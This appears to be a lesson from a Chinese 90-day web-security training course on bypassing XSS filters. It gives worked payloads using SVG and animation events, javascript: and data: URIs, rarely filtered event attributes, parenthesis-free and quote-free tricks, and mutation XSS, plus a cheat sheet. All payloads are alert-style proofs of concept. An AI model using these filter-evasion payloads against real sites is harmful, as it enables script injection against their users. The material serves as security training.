---
title: Day039：XSS 进阶 - 绕过进阶（事件属性与特殊标签）
tags:
  - 网络安全
  - XSS
  - 高级绕过
categories:
  - 90天安全突击
stage: 攻坚
abbrlink: d039
date: 2026-03-02
updated: 2026-01-28
---

# Day039：XSS 进阶 - 绕过进阶（事件属性与特殊标签）

## 基本信息

| 项目 | 内容 |
|------|------|
| **所属阶段** | 攻坚（第二阶段） |
| **所属周次** | Week 7：XSS 进阶与 CSRF |
| **今日主题** | XSS 高级绕过技巧 |
| **预计时间** | 3 小时 |
| **难度等级** | 进阶+ |

---

## 今日痛点场景

> **场景**：你发现一个 XSS 点，但 `<script>`、`onerror`、`onload` 全被过滤了，连 `alert` 都被干掉了！
>
> **问题**：常见的绕过方式都不管用了，怎么办？
>
> **今天的任务**：学习高级绕过技巧——SVG、MathML、伪协议，总有一条路能走通。

---

## 今日目标

- [ ] 掌握 SVG 标签的 XSS 利用
- [ ] 掌握伪协议（javascript:）的绕过
- [ ] 学会利用冷门事件属性
- [ ] 理解 Mutation XSS（mXSS）

**闯关条件**：在过滤了常见标签和事件的环境中成功弹窗。

---

## 实战任务（先动手！）

### 任务 1：SVG 标签利用（30 分钟）

**为什么 SVG 特殊？**
- SVG 是 XML 格式，解析规则与 HTML 不同
- SVG 内部可以嵌套 script 和事件
- 很多过滤器忽略 SVG

**基础 Payload**：
```html
<svg onload=alert(1)>
<svg/onload=alert(1)>
<svg onload="alert(1)">
```

**SVG 内嵌 script**：
```html
<svg><script>alert(1)</script></svg>
<svg><script>alert`1`</script></svg>
```

**SVG 动画事件**：
```html
<svg><animate onbegin=alert(1) attributeName=x dur=1s>
<svg><set onbegin=alert(1) attributeName=x to=1>
```

**记录**：
```
成功的 SVG Payload：________________
```

---

### 任务 2：伪协议利用（25 分钟）

**javascript: 伪协议**：
```html
<a href="javascript:alert(1)">click</a>
<iframe src="javascript:alert(1)">
<form action="javascript:alert(1)"><input type=submit>
<object data="javascript:alert(1)">
```

**data: 伪协议**：
```html
<a href="data:text/html,<script>alert(1)</script>">click</a>
<iframe src="data:text/html,<script>alert(1)</script>">
<object data="data:text/html,<script>alert(1)</script>">
```

**Base64 编码**：
```html
<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
```

**记录**：
```
成功的伪协议 Payload：________________
```

---

### 任务 3：冷门事件属性（30 分钟）

当 `onerror`、`onload` 被过滤时，试试这些：

**表单相关**：
```html
<input onfocus=alert(1) autofocus>
<input onblur=alert(1) autofocus><input autofocus>
<textarea onfocus=alert(1) autofocus>
<select onfocus=alert(1) autofocus>
<keygen onfocus=alert(1) autofocus>
```

**动画相关**：
```html
<marquee onstart=alert(1)>
<marquee onbounce=alert(1) behavior=alternate>
<marquee onfinish=alert(1) loop=1>
```

**媒体相关**：
```html
<video><source onerror=alert(1)>
<audio><source onerror=alert(1)>
<video onloadstart=alert(1) autoplay><source src=x>
```

**其他冷门事件**：
```html
<body onpageshow=alert(1)>
<body onhashchange=alert(1)><a href=#>click</a>
<details ontoggle=alert(1) open>
<meter onmouseover=alert(1)>hover</meter>
```

**记录**：
```
可用的冷门事件：________________
```

---

### 任务 4：括号和关键字绕过（30 分钟）

**alert 被过滤？**
```javascript
prompt(1)
confirm(1)
console.log(1)
document.write(1)
```

**括号被过滤？**
```javascript
// 使用反引号（模板字符串）
alert`1`
prompt`1`

// 使用 onerror 配合 throw
<img src=x onerror=alert`1`>
<svg onload=alert`1`>

// 使用 location
<img src=x onerror=location='javascript:alert(1)'>
```

**引号被过滤？**
```html
<img src=x onerror=alert(1)>
<img src=x onerror=alert(/xss/)>
<img src=x onerror=alert(String.fromCharCode(88,83,83))>
```

**记录**：
```
无括号的 Payload：________________
无引号的 Payload：________________
```

---

### 任务 5：Mutation XSS（mXSS）概念（25 分钟）

**什么是 mXSS？**

当 HTML 经过浏览器解析→序列化→再解析后，结构发生变化，导致原本安全的内容变得危险。

**经典案例**：
```html
<!-- 原始输入（看起来安全） -->
<listing>&lt;img src=x onerror=alert(1)&gt;</listing>

<!-- 浏览器内部处理后可能变成 -->
<img src=x onerror=alert(1)>
```

**利用 innerHTML 的 mXSS**：
```javascript
// 某些浏览器处理特殊标签时会出现问题
div.innerHTML = '<noscript><img src=x onerror=alert(1)></noscript>';
// 在某些情况下，noscript 内的内容会被执行
```

**记录**：
```
对 mXSS 的理解：________________
```

---

## 今日闯关检查

| 检查项 | 分数 |
|--------|------|
| 成功使用 SVG 绕过 | 25 分 |
| 成功使用伪协议 | 20 分 |
| 掌握冷门事件属性 | 20 分 |
| 成功绕过括号/关键字过滤 | 20 分 |
| 理解 mXSS 概念 | 15 分 |

**60 分及格，80 分优秀，100 分满分**

你的得分：____

---

## 底层补课

### SVG 解析特点

```
HTML 解析器 vs XML 解析器：

HTML：容错性强，标签可以不闭合
     <img src=x onerror=alert(1)>  ← 有效

XML/SVG：严格解析
     <svg><script>alert(1)</script></svg>  ← 需要闭合

SVG 内部支持 script 标签和事件属性
这让它成为 XSS 绕过的利器
```

### 事件属性完整列表

| 类别 | 事件 | 触发条件 |
|------|------|----------|
| 加载类 | onload, onerror | 元素加载/加载失败 |
| 焦点类 | onfocus, onblur | 获得/失去焦点 |
| 鼠标类 | onclick, onmouseover, onmouseout | 鼠标交互 |
| 表单类 | onsubmit, onchange, oninput | 表单操作 |
| 动画类 | onbegin, onend, onstart | 动画生命周期 |
| 媒体类 | onplay, onpause, onloadstart | 媒体播放 |
| 其他 | ontoggle, onpageshow, onhashchange | 特殊场景 |

### JavaScript 执行上下文

```javascript
// 以下都能执行代码：
eval('alert(1)')
Function('alert(1)')()
setTimeout('alert(1)', 0)
setInterval('alert(1)', 1000)

// 利用 constructor
[].constructor.constructor('alert(1)')()
''.constructor.constructor('alert(1)')()
```

---

## 避坑指南

| 坑点 | 症状 | 解决方案 |
|------|------|----------|
| SVG 被转义 | `<svg>` 变成 `&lt;svg&gt;` | 输出点在 SVG 上下文才有效 |
| 伪协议被拦截 | javascript: 被删除 | 尝试大小写 `JavaScript:` 或空格 `java script:` |
| 事件不触发 | 需要用户交互 | 用 autofocus/autoplay 自动触发 |
| CSP 拦截 | inline script 被阻止 | 这是另一个话题（Week 7 后续） |

---

## 知识卡片速查

### 高级绕过 Payload 速查

```html
# SVG 系列
<svg onload=alert(1)>
<svg><script>alert(1)</script></svg>
<svg><animate onbegin=alert(1) attributeName=x>

# 伪协议系列
<a href=javascript:alert(1)>click</a>
<iframe src=javascript:alert(1)>
<iframe src="data:text/html,<script>alert(1)</script>">

# 冷门事件系列
<details ontoggle=alert(1) open>
<marquee onstart=alert(1)>
<input onfocus=alert(1) autofocus>
<body onpageshow=alert(1)>

# 无括号执行
<svg onload=alert`1`>
<img src=x onerror=location='javascript:alert(1)'>

# 无引号
<img src=x onerror=alert(1)>
<img src=x onerror=alert(/xss/)>
```

### 绕过技巧总结

```
标签被过滤 → SVG、MathML、自定义标签
事件被过滤 → 冷门事件、动画事件
alert 被过滤 → prompt、confirm、eval
括号被过滤 → 反引号、location
引号被过滤 → 不使用引号、用 / 代替
空格被过滤 → 用 / 或 Tab 或换行
```

---

## 常见问题

**Q1：为什么 SVG 这么常用于绕过？**

A1：
1. SVG 有自己的命名空间，解析规则不同
2. 很多 WAF 和过滤器没有正确处理 SVG
3. SVG 内部可以执行 JavaScript
4. SVG 支持大量事件属性

**Q2：data: 协议和 javascript: 协议有什么区别？**

A2：
- `javascript:` 直接执行 JS 代码
- `data:` 可以加载完整的 HTML 文档
- `data:` 可以 Base64 编码，更隐蔽
- 现代浏览器对顶层导航限制了 data:

**Q3：mXSS 在实际中常见吗？**

A3：mXSS 比较少见，但在以下场景可能出现：
1. 使用 innerHTML 处理用户输入
2. 使用不完善的 HTML 净化库
3. 浏览器解析差异

---

## 明日预告

**Day 040：XSS 进阶 - DOM XSS 原理与挖掘**

明天你将：
- 理解 DOM XSS 与反射型 XSS 的区别
- 学习 source 和 sink 的概念
- 掌握 DOM XSS 的挖掘技巧

---

## 学习记录

| 项目 | 内容 |
|------|------|
| 实际学习日期 | |
| 最有效的高级绕过 | |
| 发现的冷门事件 | |
| 今日收获 | |

---

> **导师点评**：
>
> 今天的内容开始"刁钻"了。
>
> SVG、伪协议、冷门事件——这些都是实战中的"后手牌"。当常规打法被封死，就要祭出这些。
>
> 但记住：**绕过技巧是无穷的，过滤规则也在不断更新**。这是一场永无止境的猫鼠游戏。
>
> 真正的高手不是记住所有 Payload，而是理解浏览器解析原理，能自己构造新的绕过方式。
>
> **死记硬背不如理解原理**。

```bash
echo "Day 039 Complete! XSS 高级绕过解锁！"
```
